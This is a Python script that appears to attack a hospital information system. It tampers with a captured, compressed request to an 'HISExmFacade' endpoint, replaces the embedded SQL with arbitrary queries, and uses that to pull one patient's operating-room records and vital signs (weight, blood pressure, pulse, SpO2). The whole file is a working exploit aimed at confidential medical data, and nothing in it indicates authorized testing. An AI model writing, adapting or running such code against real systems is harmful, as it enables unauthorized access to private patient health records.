from his_client_final import HISClient
import requests
import zlib
import re

class ORHunter(HISClient):
    def execute_sql(self, sql):
        #print(f"[*] Executing: {sql.strip()}")
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}). Cannot execute.")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

hunter = ORHunter()
hhistnum = '003617083J'

tables = ["CPOE.OR_ROOM_REC", "CPOE.OR_SIGN_IN"]

for t in tables:
    print(f"--- Checking {t} ---")
    q = f"SELECT * FROM {t} WHERE HHISNUM = '{hhistnum}'"
    res = hunter.execute_sql(q)
    if res and "<NewDataSet>" in res:
        print(f"[+] Data returned for {t}!")
        # Print column names to understand schema
        cols = re.findall(r'<xs:element name="(.*?)"', res)
        print(f"Columns: {cols[:20]}") # First 20 cols
        
        # Dump Rows
        rows = re.findall(r'<DRMODIFY.*?>(.*?)</DRMODIFY>', res, re.DOTALL)
        for row in rows:
            print("Row:")
            # Extract common interesting fields
            for f in ['WEIGHT', 'HEIGHT', 'BTEAR', 'PULSE', 'RESP', 'SBP', 'DBP', 'SPO2', 'SEQ', 'ORDSEQ', 'SIGNDATETIME']:
                m = re.search(f"<{f}>(.*?)</{f}>", row)
                if m: print(f"  {f}: {m.group(1)}")
            
            # Check for matches
            if "49.1" in row: print("  !!! FOUND 49.1 !!!")
            if "157" in row: print("  !!! FOUND 157 !!!")
            if "100" in row: print("  !!! FOUND 100 (Maybe SpO2) !!!")
